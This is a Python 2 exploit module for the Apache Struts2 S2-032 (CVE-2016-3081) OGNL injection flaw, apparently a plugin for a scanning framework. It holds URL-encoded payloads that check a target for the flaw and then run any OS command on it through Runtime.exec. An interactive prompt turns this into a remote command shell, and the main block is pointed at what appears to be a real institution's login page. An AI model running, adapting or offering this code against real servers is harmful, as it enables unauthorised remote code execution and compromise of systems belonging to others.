#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import requests
import re
from lib.core.data import logger


readme = {
    "url": "target url"
}


# 自定义设置区域#
headers = {'user-agent':'Mozilla/2.0 (Windows NT 3.1; rv:42.0) Gecko/200101 Firefox/12.0',
    'Cookie':'JSESSIONID=75C9ED1CD9345SAWA328D2SA6812',
    'SOAPAction':'""',
    'Safety-Testing':'By CF_HB',
    }

proxy = {'http': 'http://127.0.0.1:8080'}

timeout = 5

# 用于POC鉴别是否存在漏洞
hashKey = "This_site_has_s2-032_vulnerabilities"


S2032POC = []
# POC集合
# 在POC的判断点替换成：This_site_has_s2-032_vulnerabilities
S2032POC.append("?test=This_site_has_s2-032_vulnerabilities&method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23str%3d%23parameters.test,%23res%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23res.print(%23str[0]),%23res.flush(),%23res.close")
S2032POC.append("?method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&command=echo  This_site_has_s2-032_vulnerabilities")


S2032EXP = []
# command_exp集合
# 新的EXP在执行命令的点设置为:GiveMeCommand,然后像下面的方式添加即可
# nsf_exp
S2032EXP.append("?method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&command=GiveMeCommand")
# shack2_exp
S2032EXP.append("?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=GiveMeCommand&pp=\\\\A&ppp=%20&encoding=UTF-8")
S2032EXP.append("?method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d{},%23_memberAccess[%23parameters.name3[0]]%3d{},%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&name=allowStaticMethodAccess&name1=allowPrivateAccess&name2=excludedPackageNamePatterns&name3=excludedClasses&cmd=GiveMeCommand&pp=\\\\AAAA&ppp=%20&encoding=UTF-8 ")

# 用于鉴别EXP是否成功利用的错误关键字
Error_Message = [r'</[^>]+>', r'Error report', r'Apache Tomcat', r'memberAccess', r'ServletActionContext']


def VerityS2032(url, S2032POC):
    try:
        k = (len(url)+10)/2 + 10
        poc_count = 1
        logger.info("You have %s POCS" % str(len(S2032POC)))
        for poc in S2032POC:
            targetURL = url+poc
            logger.info('trying poc %d' % poc_count)
            req = requests.get(targetURL, headers=headers, timeout=timeout)
            resulttext = req.text.encode("utf-8").strip().strip('\x00')
            if hashKey in resulttext:
                msg = "Successful!\n %s is vulnerable [S2-032(CVE-2016-3081)]" % url
                logger.success(msg)
                return True
            else:
                poc_count = poc_count + 1
                pass
        logger.warning("%s is not vulnerable S2-032" % url)
        return False
    except Exception, e:
        logger.warning("something error!!")
        return False

def ExcuteOsCommand(url, yourcommand, S2032EXP):
    try:
        exp_k = (len(url)+10)/2 + 10
        logger.info("You have %s EXPS" % str(len(S2032EXP)))
        exp_count = 1
        exp_over = False
        for exp in S2032EXP:
            exp_wrong = True
            logger.info("Trying exp %s" % str(exp_count))
            comm = exp.replace("GiveMeCommand", str(yourcommand))
            # targetURL = url
            targetURL = url+comm
            req = requests.get(targetURL, headers=headers, timeout=timeout)
            resulttext = req.text.encode("utf-8").strip()

            comdresulttext = resulttext.strip('\x00')
            for p in Error_Message:
                m = re.search(p, comdresulttext)
                if m:
                    exp_wrong = True
                    break
                else:
                    exp_wrong = False
                    continue
            if exp_wrong:
                exp_count = exp_count + 1
                exp_over = False
                continue
            else:
                print '-'*exp_k+"Executed successfully"+'-'*(exp_k-2)
                print '-'*14
                print 'Command# '+yourcommand
                print '-'*14
                print "Result:"
                print '-'*exp_k
                print comdresulttext
                print '-' * exp_k
                exp_over = True
                break
        if not exp_over:
            logger.warning("All EXP failed...")
    except Exception, e:
        logger.warning("something error!! %s" % e)


def CommandTool(url):
    flag = VerityS2032(url, S2032POC)
    if flag:
        logger.info("The next to enter cmdExp, 'q' will quit")
        while True:
            comm = raw_input("~$ ")
            if 'q' == comm:
                print "exit...."
                exit(0)
            elif comm != "":
                ExcuteOsCommand(url, comm, S2032EXP)


def poc(target):
    return VerityS2032(target, S2032POC)


def run(arg):
    url = arg["url"]
    CommandTool(url)


if __name__ == "__main__":
#    poc("http://ycjy.scezju.com/jjxt/yhLogin.action")
    run({"url": "http://ycjy.scezju.com/jjxt/yhLogin.action"})
#    CommandTool("http://ycjy.scezju.com/jjxt/yhLogin.action")

